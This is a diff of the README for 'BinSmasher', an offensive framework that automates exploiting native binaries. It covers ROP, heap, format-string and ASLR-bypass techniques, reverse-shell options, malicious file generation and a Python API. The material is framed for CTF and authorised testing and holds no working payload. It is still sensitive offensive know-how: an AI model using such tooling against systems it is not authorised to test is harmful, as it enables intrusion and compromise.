@@ -1,93 +1,81 @@
 # BinSmasher 🔨
 
-**Ultimate Cross-Platform Binary Exploitation Framework**
+**Production-Ready Binary Exploitation Framework**
 
-<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />
+<img width="1024" height="1024" alt="BinSmasher Logo" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />
 
-> Authorized use only: CTF · pentest · security research  
-> Unauthorized access to systems you do not own is illegal.
-
----
-
-## Table of Contents
-
-1. [Overview](#overview)
-2. [Installation](#installation)
-3. [Architecture](#architecture)
-4. [Subcommands](#subcommands)
-5. [binary — Full Reference](#binary--full-reference)
-   - [Basic Options](#basic-options)
-   - [Network Options](#network-options)
-   - [Payload Options](#payload-options)
-   - [Custom Payload Mode (UDP+Spawn)](#custom-payload-mode-udpspawn)
-   - [Fuzzing Options](#fuzzing-options)
-   - [Advanced Exploit Options](#advanced-exploit-options)
-   - [New Exploit Techniques](#new-exploit-techniques)
-   - [DOS / Script Generation](#dos--script-generation)
-   - [Output Options](#output-options)
-6. [Exploit Techniques — TCP Mode](#exploit-techniques--tcp-mode)
-7. [Exploit Techniques — UDP+Spawn Mode](#exploit-techniques--udpspawn-mode)
-8. [Custom Payload Mode — Deep Dive](#custom-payload-mode--deep-dive)
-9. [file — Malicious File Generation](#file--malicious-file-generation)
-10. [solana — Agave / Solana SVM Auditing](#solana--agave--solana-svm-auditing)
-11. [Usage Examples](#usage-examples)
-12. [Technique Decision Tree](#technique-decision-tree)
-13. [Known Limitations](#known-limitations)
-14. [Dependencies](#dependencies)
+> **Authorized use only**: CTF competitions, penetration testing, security research  
+> **Unauthorized access to systems you do not own is illegal.**
 
 ---
 
-## Overview
+## ✨ Key Features
 
-BinSmasher automates the full exploitation lifecycle for native binaries:
-
-1. **Vuln detection** — probes the service to determine vulnerability class automatically
-2. **Static analysis** — finds dangerous functions, protections, gadgets, libc offsets
-3. **Offset detection** — cyclic pattern + corefile / GDB / remote crash bisection
-4. **Strategy selection** — automatically picks the best exploit technique (20+ strategies)
-5. **Exploit delivery** — sends payload, verifies RCE, drops to interactive shell
-6. **Template generation** — writes a complete `solve_BINARY.py` ready to run
-
-It handles **TCP services**, **UDP crash-and-die services** (spawn-target mode), and **32/64-bit** ELF binaries.
+| Feature | Description |
+|---------|-------------|
+| 🔍 **Auto-Detection** | Automatically detects vulnerability type, protections, win functions, and exploit strategy |
+| 🎯 **43+ Techniques** | ret2win, ret2libc, ROP, SROP, ORW, heap, format string, FSOP, ASLR bypass, etc. |
+| 🛡️ **Protection Bypass** | PIE, NX, ASLR, canary, RELRO, seccomp, CFI, SafeSEH |
+| 📊 **Binary Analysis** | Static analysis, gadget finding, libc fingerprinting, seccomp parsing |
+| ⚙️ **Fully Configurable** | Custom win function names, offset ranges, and exploit parameters via CLI |
+| 🔗 **Network Ready** | TCP, UDP, TLS support with adaptive timeouts |
+| 🧪 **Test Suite** | 27+ unit tests, 25+ integration tests, comprehensive coverage |
+| 📝 **Auto-Generated** | Exploit scripts, GDB scripts, crash scripts, CTF writeups |
+| 🔧 **Extensible** | Modular mixin architecture (23 mixins), easy to add new techniques |
 
 ---
 
-## Installation
+## 🚀 Quick Start
 
 ```bash
 # System dependencies
-sudo apt-get install -y python3 python3-pip gdb radare2 \
-    pwndbg one_gadget binutils file socat checksec
+sudo apt-get install -y python3 python3-pip gdb radare2 socat \
+    binutils file patchelf checksec
 
 # Python dependencies
-pip install pwntools capstone keystone-engine \
-    frida-tools ropper boofuzz rich
+pip install pwntools rich boofuzz frida-tools ropper
+
+# Optional: angr symbolic execution (large)
+pip install angr
 
 # Optional: AFL++ coverage fuzzing
 sudo apt-get install -y afl++
 
-# Optional: angr symbolic execution (large but powerful)
-pip install angr
+# Optional: one_gadget (Ruby gem)
+gem install one_gadget
+```
 
-# Clone or unzip release
+### Install as global command
+
+```bash
 git clone https://github.com/your-org/binsmasher
 cd binsmasher
-
-# Run directly (no install required)
-python3 src/main.py --help
-
-# Or install as global command
 pip install -e .
 binsmasher --help
 ```
 
-### Docker (recommended for reproducible environments)
+### Docker
 
 ```bash
 docker build -t binsmasher .
 docker run --rm -it --network host --cap-add SYS_PTRACE \
-  -v $(pwd):/workspace binsmasher binary -b /workspace/vuln \
-  --host 127.0.0.1 --port 4444 -t
+  -v $(pwd):/workspace binsmasher binary --help
+```
+
+---
+
+## Quick Start
+
+```bash
+# Run directly (no install)
+python3 src/main.py binary -b ./vuln --host 127.0.0.1 --port 4444 -t
+
+# Installed command
+binsmasher binary -b ./vuln --host 127.0.0.1 --port 4444 -t
+
+# Auto-detect vuln type, use adaptive timeouts, generate solve template
+binsmasher binary -b ./vuln --host ctf.io --port 4444 \
+  --detect-vuln --adaptive-timeout --template -t
 ```
 
 ---
@@ -97,74 +85,89 @@ docker run --rm -it --network host --cap-add SYS_PTRACE \
 ```
 binsmasher/
 ├── src/
-│   ├── main.py                       # Entry point & CLI (600+ lines)
-│   ├── binsmasher_main.py            # Pip console-script shim
+│   ├── main.py                       # Entry point & CLI
+│   ├── binsmasher_main.py            # pip console-script shim
 │   │
-│   ├── utils/                        # Core utilities
+│   ├── utils/
 │   │   ├── config.py                 # ExploitConfig dataclass
 │   │   ├── display.py                # Rich summary table
-│   │   ├── logging_setup.py          # Dual-sink logging (rich + file)
-│   │   ├── _process.py               # Core-dump suppression, temp dirs
-│   │   ├── adaptive_timeout.py       # RTT-based adaptive timeouts ★ NEW
-│   │   └── json_output.py            # JSON/Markdown structured output ★ NEW
+│   │   ├── logging_setup.py          # Dual-sink logging
+│   │   ├── _process.py               # Core-dump isolation (/tmp/binsmasher_*)
+│   │   ├── adaptive_timeout.py       # RTT-based timeout scaling
+│   │   ├── json_output.py            # JSON/Markdown structured output
+│   │   ├── progress.py               # Rich progress bars, noise suppression
+│   │   └── writeup.py                # CTF writeup generator
 │   │
-│   ├── analyzer/                     # Binary analysis
+│   ├── analyzer/
 │   │   ├── static.py                 # r2 static analysis (cached)
-│   │   ├── protections.py            # NX/PIE/ASLR/canary/RELRO (cached)
+│   │   ├── protections.py            # checksec-based protection detection
+│   │   ├── binary_info.py            # Correct ELF-header detection (ET_DYN/PIE, GNU_STACK/NX)
 │   │   ├── dynamic.py                # Frida instrumentation
 │   │   ├── library.py                # libc offset loading, libc.rip queries
-│   │   ├── seccomp.py                # seccomp-tools BPF detection
-│   │   ├── recovery.py               # Stripped binary recovery, angr
-│   │   ├── cache.py                  # SHA256 analysis cache (~/.binsmasher_cache/) ★ NEW
-│   │   ├── angr_analysis.py          # angr symbolic path exploration ★ NEW
-│   │   ├── vuln_detect.py            # Automatic vuln type detection ★ NEW
-│   │   └── libc_db.py                # Local libc database (9 libcs, no internet) ★ NEW
+│   │   ├── seccomp.py                # seccomp-tools integration
+│   │   ├── seccomp_parser.py         # Seccomp detection without seccomp-tools (pure Python)
+│   │   ├── recovery.py               # Stripped binary recovery
+│   │   ├── cache.py                  # SHA256 analysis cache (~/.binsmasher_cache/)
+│   │   ├── angr_analysis.py          # angr symbolic path exploration
+│   │   ├── vuln_detect.py            # Automatic vulnerability type detection
+│   │   ├── libc_db.py                # Local libc database (9 versions, no internet)
+│   │   └── libc_fingerprint.py       # Multi-symbol libc fingerprinting
 │   │
-│   ├── exploiter/                    # Exploit engine
+│   ├── exploiter/
 │   │   ├── connection.py             # TCP/UDP connection management
-│   │   ├── offset.py                 # Cyclic + corefile + GDB offset detection
+│   │   ├── offset.py                 # Offset detection (corefile/GDB/remote bisect)
 │   │   ├── rop_chains.py             # ret2win, ret2libc, SROP, ORW, ret2dlresolve
-│   │   ├── heap.py                   # Basic heap: UAF, fastbin, tcache (basic)
-│   │   ├── heap_advanced.py          # Advanced heap: tcache poison, House of Apple2,
-│   │   │                             #   __malloc_hook, __free_hook, DynELF ★ NEW
-│   │   ├── gadgets.py                # ROPgadget/ropper integration, one_gadget
+│   │   ├── heap.py                   # Basic heap: UAF, fastbin, tcache
+│   │   ├── heap_advanced.py          # tcache+safe-linking, House of Apple2, DynELF
+│   │   ├── heap_groom.py             # Heap grooming, spray, off-by-one/null, ret2mprotect
+│   │   ├── gadgets.py                # ROPgadget/ropper, one_gadget
 │   │   ├── shellcode.py              # Shellcode + XOR encoding
-│   │   ├── format_string.py          # fmtstr_payload, GOT overwrite
+│   │   ├── format_string.py          # Basic format string (Partial RELRO)
+│   │   ├── format_string_advanced.py # Full RELRO bypass, PIE-aware, stack write
 │   │   ├── windows.py                # SafeSEH, CFG, CFI bypass
-│   │   ├── scripts.py                # Crash/exploit script generation
+│   │   ├── scripts.py                # Script generation (crash/exploit/GDB)
 │   │   ├── orchestrator.py           # create_exploit: master TCP strategy selector
-│   │   ├── multistage.py             # Two-stage TCP (leak → ret2system) ★ NEW
-│   │   ├── interactive.py            # Interactive shell + solve template ★ NEW
-│   │   ├── brute_aslr.py             # ASLR brute (PIE/libc/partial) ★ NEW
-│   │   ├── i386.py                   # Correct 32-bit ROP chains ★ NEW
-│   │   ├── udp_strategies.py         # UDP+spawn exploit engine (A–F)
-│   │   └── helpers.py                # Address/process utilities
+│   │   ├── multistage.py             # Two-stage TCP (leak GOT → ret2system)
+│   │   ├── interactive.py            # Interactive shell + solve template
+│   │   ├── brute_aslr.py             # ASLR brute (PIE base / libc / partial overwrite)
+│   │   ├── aslr_bypass.py            # Automatic ASLR/PIE bypass (fmtstr leak, libc ID)
+│   │   ├── win_detector.py           # Automatic win function detection (39+ patterns)
+│   │   ├── i386.py                   # Correct 32-bit ROP chains (cdecl, int 0x80, SROP)
+│   │   ├── arm64.py                  # AArch64 exploit primitives (svc, SROP, gadgets)
+│   │   ├── fsop.py                   # FSOP for glibc 2.34+ (House of Banana/Emma/Kiwi)
+│   │   ├── canary_leak.py            # Canary leak without fork-server
+│   │   ├── session.py                # Stateful menu/login service interaction
+│   │   └── udp_strategies.py         # UDP+spawn exploit engine (A–F)
 │   │
-│   ├── fuzzer/                       # Fuzzing engine
+│   ├── fuzzer/
 │   │   ├── afl.py                    # AFL++ coverage fuzzing
 │   │   ├── boofuzz_fuzz.py           # boofuzz network fuzzing
 │   │   ├── mutation.py               # Built-in mutation fuzzer
 │   │   ├── udp.py                    # UDP offset detection (bisect + corefile)
-│   │   ├── core_analysis.py          # Core dump analysis, GDB crash analysis
+│   │   ├── core_analysis.py          # Core dump analysis
 │   │   ├── gdb_scripts.py            # GDB script generation (pwndbg/peda/vanilla)
 │   │   ├── offset_roto.py            # ROTO heuristic, SIGFAULT analysis
 │   │   └── solana.py                 # Solana/Agave SVM fuzzing
 │   │
-│   └── file_exploiter/               # Malicious file builders (25+ formats)
+│   └── file_exploiter/
 │       ├── audio.py                  # MP3, WAV, FLAC, OGG, AAC
 │       ├── documents.py              # PDF, DOC, DOCX, XLS, XLSX, RTF
-│       ├── web.py                    # TXT, CSV, JSON, XML, HTML, SVG
+│       ├── web.py                    # JSON, XML, HTML, SVG, TXT, CSV
 │       ├── images.py                 # BMP, PNG, GIF, JPEG
 │       ├── scripts_fmt.py            # PY, JS, PHP, LUA, RB
-│       └── archives.py               # ZIP, TAR, ELF
+│       └── archives.py               # ZIP, TAR, ELF, RAW
+│
+├── binsmasher/
+│   └── __init__.py                   # Python library API (BinSmasher class)
 │
 ├── tests/
 │   ├── test_suite.py                 # Integration test runner
-│   ├── bins/                         # Compiled test binaries (make)
+│   ├── test_new_features.py          # Unit/integration tests for new modules
+│   ├── bins/                         # Compiled test binaries
 │   └── src/                          # 13 C test sources + Makefile
 │
-├── Dockerfile                        # Reproducible environment ★ NEW
-├── docker-compose.yml                # Docker Compose ★ NEW
+├── Dockerfile
+├── docker-compose.yml
 ├── setup.py
 └── pyproject.toml
 ```
@@ -174,15 +177,9 @@ binsmasher/
 ## Subcommands
 
 ```bash
-# Direct run
-python3 src/main.py binary   [options]
-python3 src/main.py file     [options]
-python3 src/main.py solana   [options]
-
-# Installed command
-binsmasher binary   [options]
-binsmasher file     [options]
-binsmasher solana   [options]
+binsmasher binary   [options]   # ELF/PE binary exploitation
+binsmasher file     [options]   # Malicious file generation
+binsmasher solana   [options]   # Agave/Solana SVM auditing
 ```
 
 ---
@@ -194,12 +191,12 @@ binsmasher solana   [options]
 | Flag | Default | Description |
 |---|---|---|
 | `-b`, `--binary` | required | Path to target binary |
-| `-c`, `--cmd` | `id` | Command for shellcode |
+| `-c`, `--cmd` | `id` | Command for shellcode payloads |
 | `-p`, `--pattern-size` | `200` | Initial cyclic pattern size |
 | `-r`, `--return-addr` | auto | Hex return address (skips auto-detection) |
 | `--return-offset` | `80` | Bytes from stack addr to return addr |
 | `-t`, `--test-exploit` | off | Fire exploit and verify RCE |
-| `-l`, `--log-file` | auto in /tmp | Log file path (DEBUG level) |
+| `-l`, `--log-file` | auto `/tmp` | Log file path |
 
 ### Network Options
 
@@ -217,15 +214,13 @@ binsmasher solana   [options]
 |---|---|---|
 | `--reverse-shell` | off | Reverse shell payload |
 | `--file-input` | — | Embed shellcode in `mp3` or `raw` file |
-| `--binary-args` | `""` | Args to pass to spawned binary |
-| `--payload-data` | — | Custom payload template (`{PAYLOAD}` placeholder) |
+| `--binary-args` | `""` | Arguments to pass to spawned binary |
+| `--payload-data` | — | Custom payload template (`{PAYLOAD}` placeholder for UDP+spawn) |
 | `--udp` | off | Send `--payload-data` via UDP |
 | `--spawn-target` | off | Spawn binary locally for crash detection |
-| `--bad-bytes` | `""` | Hex bytes to avoid in exploit addresses (e.g. `0a0d`) |
-
-### Custom Payload Mode (UDP+Spawn)
-
-Enabled when **all three** are set: `--payload-data` + `--udp` + `--spawn-target`.
+| `--bad-bytes` | `""` | Hex bytes to avoid in exploit addresses (e.g. `0a0d` for SIP) |
+| `--menu-script` | — | JSON interaction script for menu-based services |
+| `--pre-send` | — | Hex bytes to send before exploit payload |
 
 ### Fuzzing Options
 
@@ -238,283 +233,382 @@ Enabled when **all three** are set: `--payload-data` + `--udp` + `--spawn-target
 | `--frida` | off | Frida dynamic instrumentation |
 | `--protocol` | `raw` | Protocol hint for boofuzz |
 
-### Advanced Exploit Options
+### Exploit Techniques
 
 | Flag | Default | Description |
 |---|---|---|
-| `--heap-exploit` | off | Basic heap exploitation (UAF, fastbin, tcache basic) |
-| `--safeseh-bypass` | off | SafeSEH bypass (Windows) |
-| `--privilege-escalation` | off | Post-exploit privesc |
-| `--cfi-bypass` | off | CFI bypass via valid-target pivot |
-| `--stack-pivot` | off | Stack pivot via `leave; ret` |
+| `--detect-vuln` | off | Auto-detect vulnerability type (STACK_OVERFLOW, FORMAT_STRING, HEAP_OVERFLOW, UAF, INTEGER_OVERFLOW) |
+| `--multistage` | off | Two-stage TCP: leak GOT address → compute libc base → ret2system |
+| `--multisym-leak` | off | Leak 3 GOT symbols simultaneously for precise libc fingerprinting |
+| `--brute-aslr` | off | Brute-force ASLR without a leak |
+| `--brute-attempts` | `256` | Max ASLR brute attempts |
+| `--srop` | off | Force SROP chain (Sigreturn-Oriented Programming) |
+| `--orw` | off | Force ORW chain (open/read/write flag — seccomp bypass) |
+| `--flag-path` | `/flag` | Flag file path for ORW chain |
+| `--win-names` | `win,flag,shell...` | Comma-separated list of win function names to detect |
+| `--offset-min` | `8` | Minimum offset to try for brute force |
+| `--offset-max` | `520` | Maximum offset to try for brute force |
+| `--offset-step` | `8` | Step size for offset brute force |
+| `--ret2mprotect` | off | Force ret2mprotect (make memory executable, inject shellcode) |
+| `--off-by-one` | off | Detect and exploit off-by-one / off-by-null heap overflows |
+| `--angr` | off | Use angr symbolic execution to find win() path |
+| `--interactive` | off | Drop to interactive shell after successful exploit |
+| `--template` | off | Generate a complete `solve_BINARY.py` template |
+| `--debug` | off | Launch binary under GDB/pwndbg |
+
+### Heap Options
+
+| Flag | Default | Description |
+|---|---|---|
+| `--heap-exploit` | off | Basic heap exploitation (UAF, fastbin dup, tcache basic) |
+| `--heap-advanced` | off | Advanced heap: tcache safe-linking bypass, House of Apple2, DynELF, malloc/free hook |
 | `--largebin-attack` | off | Largebin attack (glibc ≥ 2.28) |
-| `--gdb-mode` | `pwndbg` | GDB script style: `pwndbg`, `peda`, `vanilla` |
-| `--srop` | off | Force SROP chain |
-| `--orw` | off | Force ORW chain (seccomp bypass) |
-| `--flag-path` | `/flag` | Flag path for ORW chain |
-
-### New Exploit Techniques
-
-| Flag | Default | Description |
-|---|---|---|
-| `--detect-vuln` | off | **Auto-detect vulnerability type** (STACK_OVERFLOW, FORMAT_STRING, HEAP_OVERFLOW, UAF, INTEGER_OVERFLOW) before exploiting |
-| `--multistage` | off | **Two-stage TCP exploit**: leak GOT address → compute libc base → ret2system |
-| `--brute-aslr` | off | **Brute-force ASLR** without a leak (PIE base, libc base, or 12-bit partial overwrite) |
-| `--brute-attempts` | `256` | Max brute-force attempts |
-| `--heap-advanced` | off | **Advanced heap techniques**: tcache poisoning with safe-linking bypass, House of Apple2, `__malloc_hook`/`__free_hook`, DynELF |
-| `--interactive` | off | **Drop to interactive shell** after successful exploit (`io.interactive()`) |
-| `--template` | off | **Generate `solve_BINARY.py`** — complete pwntools script with all detected info pre-filled |
-| `--angr` | off | **angr symbolic execution** to find path to win() and extract concrete input |
-| `--adaptive-timeout` | off | **Auto-scale all timeouts** based on measured RTT to target (for high-latency CTF servers) |
-| `--clear-cache` | off | Clear analysis cache for this binary |
-| `--no-cache` | off | Disable analysis cache for this run |
-
-### DOS / Script Generation
-
-| Flag | Description |
-|---|---|
-| `--dos` | Find offset, crash target, generate crash + exploit scripts |
-| `--generate-scripts` | Always write `crash_BINARY.py` and `exploit_BINARY.py` |
+| `--stack-pivot` | off | Stack pivot chain via `leave; ret` |
+| `--privilege-escalation` | off | Post-exploit privilege escalation attempt |
 
 ### Output Options
 
-| Flag | Description |
-|---|---|
-| `--print-json` | Print complete result as JSON to stdout (CI/CD integration) |
-| `--output-json PATH` | Write JSON result to file |
-| `--output-markdown` | Write Markdown report to `_bs_work/report_BINARY.md` |
+| Flag | Default | Description |
+|---|---|---|
+| `--print-json` | off | Print complete result as JSON to stdout |
+| `--output-json PATH` | — | Write JSON result to file |
+| `--output-markdown` | off | Write Markdown summary to `_bs_work/` |
+| `--writeup` | off | Generate full CTF-style writeup |
+| `--generate-scripts` | off | Write `crash_BINARY.py` and `exploit_BINARY.py` |
+| `--dos` | off | Crash-only mode: find offset, fire crash payload, generate scripts |
+
+### Advanced / Misc
+
+| Flag | Default | Description |
+|---|---|---|
+| `--adaptive-timeout` | off | Scale all timeouts based on measured RTT to target |
+| `--clear-cache` | off | Clear analysis cache for this binary |
+| `--no-cache` | off | Disable analysis cache for this run |
+| `--gdb-mode` | `pwndbg` | GDB script style: `pwndbg`, `peda`, `vanilla` |
+| `--safeseh-bypass` | off | SafeSEH bypass (Windows) |
+| `--cfi-bypass` | off | CFI bypass via valid-target pivot |
+| `--quiet` | off | Suppress all output except final result |
+| `--verbose` | off | Show debug-level output |
+
+---
+
+## Win Function Detection
+
+BinSmasher automatically detects win functions using 39+ built-in patterns:
+
+```
+win, flag, shell, backdoor, secret, easy, print_flag, cat_flag,
+get_flag, read_flag, show_flag, get_shell, give_shell, spawn_shell,
+drop_shell, spawn, pwned, success, solve, victory, solved, system,
+exec_shell, do_shell, run_shell, win_func, flag_func, shell_func,
+getFlag, getShell, hidden, debug, admin, root, priv, func1, func_win, pwn, ret
+```
+
+### Custom Win Functions
+
+Override with `--win-names` for binaries with non-standard naming:
+
+```bash
+# Binary has function "capture_flag()" instead of "win()"
+binsmasher binary -b ./custom --host 127.0.0.1 --port 4444 \
+  --win-names "capture_flag,steal_flag,get_flag" -t
+```
+
+### How It Works
+
+1. **Symbol table lookup** — Searches ELF symbols for matching names
+2. **Pattern matching** — Checks prefixes, suffixes, and exact matches
+3. **Disassembly analysis** — Analyzes function code for shell/flag indicators
+4. **String detection** — Looks for `/bin/sh`, `flag{`, `PWNED` in binary strings
 
 ---
 
 ## Exploit Techniques — TCP Mode
 
-| # | Technique | Trigger | Notes |
-|---|---|---|---|
-| 0 | **ret2win** | Win/flag/shell symbol found | Fastest — no leak needed |
-| 1 | **two-stage ret2libc** | `--multistage` or ASLR+NX | Leak GOT → libc.rip/local DB → system() |
-| 2 | **Libc leak via PLT** | ASLR on, puts/printf in PLT | `puts(got[sym])` → compute libc base |
-| 3 | **ret2csu leak** | No pop rdi gadget | Uses `__libc_csu_init` to set args |
-| 4 | **write-syscall leak** | No PLT leak fn | `write(1, got, 8)` via syscall chain |
-| 5 | **Canary leak/brute** | `canary_enabled` | Format string or byte-by-byte brute |
-| 6 | **PIE leak** | PIE on | Format string `%p` scan |
-| 7 | **ret2system ROP** | NX on, libc known | `pop rdi` + `/bin/sh` + `system()` |
-| 8 | **ret2csu** | No pop rdi | CSU gadgets for rdi/rsi/rdx control |
-| 9 | **SROP** | `--srop` | Sigreturn frame → `execve("/bin/sh")` |
-| 10 | **ORW** | `--orw` or seccomp | `open("/flag") + read() + write()` |
-| 11 | **Format string** | Printf detected, Partial RELRO | GOT overwrite via `%n` |
-| 12 | **Shellcode** | NX off | NOP sled + shellcode on stack |
-| 13 | **ret2libc static** | NX on, no ASLR | ROP with known libc addresses |
-| 14 | **ret2dlresolve** | No libc leak | Resolves via `.dynamic` section |
-| 15 | **tcache poisoning** | `--heap-advanced`, glibc 2.31+ | Arbitrary alloc with safe-linking bypass |
-| 16 | **House of Apple2** | `--heap-advanced`, glibc 2.34+ | `_IO_FILE` exploit, no hooks needed |
-| 17 | **malloc/free hook** | `--heap-advanced`, glibc < 2.34 | Overwrite `__malloc_hook`/`__free_hook` |
-| 18 | **DynELF** | `--heap-advanced` | Binary search for libc symbols |
-| 19 | **Brute PIE base** | `--brute-aslr`, win() present | 512 candidates for PIE slide |
-| 20 | **Brute libc base** | `--brute-aslr`, one_gadget | Guess libc base offset |
-| 21 | **Partial overwrite** | `--brute-aslr` | 12-bit fixed page offset, 16 attempts |
-| 22 | **i386 ret2libc** | 32-bit binary | Stack args: `[system][ret][binsh]` |
-| 23 | **i386 execve syscall** | 32-bit, `int 0x80` | `eax=11, ebx=binsh, int 0x80` |
-| 24 | **i386 SROP** | 32-bit, `SYS_sigreturn=119` | Sigreturn for i386 |
-| 25 | **one_gadget** | one_gadget installed | Libc magic gadget |
-| 26 | **CFI bypass** | `--cfi-bypass` | Valid-target pivot |
-| 27 | **SafeSEH bypass** | `--safeseh-bypass`, Windows | SEH overwrite |
-| 28 | **Stack pivot** | `--stack-pivot` | `leave; ret` RSP redirect |
-| 29 | **Largebin attack** | `--largebin-attack`, glibc ≥ 2.28 | `bk_nextsize` corruption |
+| # | Technique | Trigger |
+|---|---|---|
+| 0 | **ret2win** | Win/flag/shell symbol found in binary |
+| 1 | **two-stage ret2libc** | `--multistage` or ASLR+NX |
+| 2 | **ret2csu leak** | No `pop rdi` gadget available |
+| 3 | **write-syscall leak** | No PLT leak function |
+| 4 | **Canary leak (fmtstr)** | Format string detected, canary present |
+| 5 | **Canary leak (stack read)** | Service echoes more bytes than sent |
+| 6 | **Canary brute (fork)** | Fork-server detected |
+| 7 | **ret2system ROP** | NX on, libc base known |
+| 8 | **ret2csu** | No `pop rdi`, libc base known |
+| 9 | **SROP** | `--srop` or `syscall;ret` available |
+| 10 | **ORW** | `--orw` or seccomp blocks execve |
+| 11 | **Format string (Partial RELRO)** | printf detected, GOT writable |
+| 12 | **Format string (Full RELRO)** | printf detected, Full RELRO — writes to stack return address |
+| 13 | **Shellcode** | NX disabled |
+| 14 | **ret2libc static** | NX on, no ASLR |
+| 15 | **ret2dlresolve** | No libc leak, no PLT |
+| 16 | **tcache poisoning** | `--heap-advanced`, glibc 2.31+ |
+| 17 | **tcache + safe-linking bypass** | `--heap-advanced`, glibc 2.32+ |
+| 18 | **House of Apple2** | `--heap-advanced`, glibc 2.34+ |
+| 19 | **House of Banana** | `--heap-advanced`, glibc 2.34+ (`dl_fini`) |
+| 20 | **House of Emma** | `--heap-advanced`, glibc 2.34+ (`_IO_cookie`) |
+| 21 | **House of Kiwi** | `--heap-advanced`, glibc 2.34+ (`malloc_assert`) |
+| 22 | **FSOP via exit()** | `--heap-advanced`, exit triggers `_IO_flush_all_lockp` |
+| 23 | **malloc/free hook overwrite** | `--heap-advanced`, glibc < 2.34 |
+| 24 | **DynELF** | `--heap-advanced`, arbitrary read primitive |
+| 25 | **Brute PIE base** | `--brute-aslr`, win() present, PIE on |
+| 26 | **Brute libc base** | `--brute-aslr`, one_gadget known |
+| 27 | **Partial overwrite** | `--brute-aslr`, 12-bit fixed, 16 attempts |
+| 28 | **ret2mprotect** | `--ret2mprotect`, no system() available |
+| 29 | **Off-by-one/null** | `--off-by-one`, heap overlap |
+| 30 | **i386 ret2libc** | 32-bit binary, cdecl stack args |
+| 31 | **i386 execve int 0x80** | 32-bit, `int 0x80` gadget found |
+| 32 | **i386 SROP** | 32-bit, `SYS_sigreturn=119` |
+| 33 | **AArch64 ret2win** | ARM64 binary, LR overwrite |
+| 34 | **AArch64 ret2system** | ARM64, x0 gadget + system() |
+| 35 | **AArch64 execve svc** | ARM64, `x8=221, svc #0` |
+| 36 | **AArch64 SROP** | ARM64, `SYS_rt_sigreturn=139` |
+| 37 | **one_gadget** | one_gadget installed, libc known |
+| 38 | **CFI bypass** | `--cfi-bypass` |
+| 39 | **SafeSEH bypass** | `--safeseh-bypass`, Windows |
+| 40 | **Stack pivot** | `--stack-pivot`, `leave; ret` found |
+| 41 | **Largebin attack** | `--largebin-attack`, glibc ≥ 2.28 |
+| 42 | **Format string leak** | Auto-detect fmtstr vuln, leak libc/stack addresses |
+| 43 | **PIE base calc** | Calculate PIE base from leaked code pointer |
+| 44 | **Win function detection** | Auto-detect 39+ win function patterns, configurable via CLI |
 
 ---
 
 ## Exploit Techniques — UDP+Spawn Mode
 
+Activated with `--payload-data` + `--udp` + `--spawn-target`.
+
 | Strategy | Name | Viable when |
 |---|---|---|
-| A | **ret2system ROP** | `ret_addr_offset + 24 < min_crash`, pop rdi available |
-| A* | **ret2csu fallback** | Same but uses `__libc_csu_init` |
-| B | **SROP** | `syscall;ret` + `pop rax;ret` available, frame fits |
-| C | **GOT overwrite** | Pointer-overwrite crash type |
-| D | **ret2win** | Win symbol found, `ret_addr_offset + 8 < min_crash` |
-| E | **one_gadget** | `one_gadget` installed, no bad bytes, fits |
-| F | **ORW** | `--orw` flag, seccomp blocks execve |
+| A | **ret2system ROP** | `ret_offset + 24 < min_crash`, `pop rdi` available |
+| A* | **ret2csu fallback** | As above, no `pop rdi` — uses `__libc_csu_init` |
+| B | **SROP** | `syscall;ret` + `pop rax;ret`, frame fits in payload |
+| C | **GOT overwrite** | Pointer-overwrite crash pattern detected |
+| D | **ret2win** | Win symbol found, `ret_offset + 8 < min_crash` |
+| E | **one_gadget** | `one_gadget` installed, no bad bytes |
+| F | **ORW** | `--orw` flag, execve blocked by seccomp |
 
 ---
 
 ## Custom Payload Mode — Deep Dive
 
-### How it Works
+### Flow
 
 ```
-1. BISECT: find min_crash_sz — binary search over [8…4096] bytes
-2. COREDUMP: inject cyclic(min_crash_sz), collect core → extract RIP
-3. STACK SCAN: scan all mappings for cyclic bytes → exact ret addr offset
-4. BASES: PIE base + libc base from /proc/PID/maps
-5. EXPLOIT: try strategies A→F, spawn fresh binary per attempt for ASLR
+1. BISECT      Find min crash size by probing [8, 16, 32 … 4096] bytes + bisect
+2. COREDUMP    Inject cyclic(min_crash), collect core → extract RIP → stack scan
+3. BASES       Read PIE base + libc base from /proc/PID/maps
+4. EXPLOIT     Try strategies A→F, spawn fresh binary per attempt (clean ASLR)
 ```
 
-### Payload Template Format
+### Payload Template
 
-Use `{PAYLOAD}` as the injection placeholder. `Content-Length:` is auto-recalculated.
+Use `{PAYLOAD}` as injection point. `Content-Length` is auto-recalculated.
 
-**SIP/ICE INVITE:**
 ```
 INVITE sip:target@127.0.0.1 SIP/2.0
 ...
-a=ice-ufrag:{PAYLOAD}
-```
-
-**HTTP POST:**
-```
-POST /upload HTTP/1.1
 Content-Length: {CONTENT_LENGTH}
-
-{PAYLOAD}
+a=ice-ufrag:{PAYLOAD}
 ```
 
 ### Bad Bytes
 
-| Protocol | `--bad-bytes` | Reason |
-|---|---|---|
-| Raw TCP/UDP | *(empty)* | No restriction |
-| SIP / SDP | `0a0d` | `\r\n` terminates SDP lines |
-| HTTP headers | `0a0d` | `\r\n` terminates headers |
-| Null-terminated string | `00` | `\0` terminates strcpy/gets |
+| Protocol | `--bad-bytes` |
+|---|---|
+| Raw TCP/UDP | *(empty)* |
+| SIP/HTTP headers | `0a0d` |
+| Null-terminated string | `00` |
+| C string + newline | `000a0d` |
+
+---
+
+## Menu-based Services
+
+For CTF binaries with menus (alloc/free/edit/show/exit), use `--menu-script`:
+
+```bash
+binsmasher binary -b ./heap_menu --host 127.0.0.1 --port 4444 -t \
+  --menu-script '[{"recv_until":"> "},{"send_line":"1"},{"recv_until":"size: "},{"send_line":"32"},{"recv_until":"> "},{"send_line":"3"},{"recv_until":"data: "}]'
+```
+
+---
+
+## Python API
+
+```python
+from binsmasher import BinSmasher
+from exploiter import ExploitGenerator, DEFAULT_WIN_PATTERNS
+
+# Analyze with default settings
+bs = BinSmasher("./vuln", host="ctf.io", port=4444)
+bs.analyze()
+bs.detect_vuln()
+
+# Find offset + canary
+offset = bs.find_offset()
+canary = bs.leak_canary()   # tries fmtstr, stack read, fork brute
+
+# Build and send exploit
+chain = bs.build_rop("auto")   # auto-selects: win → system → srop → execve
+bs.send(chain)
+bs.interactive()
+
+# Two-stage
+ok, etype = bs.multistage()
+
+# Output
+bs.template()          # → solve_vuln.py
+bs.save_json()         # → result.json
+bs.save_writeup()      # → writeup_vuln.md
+
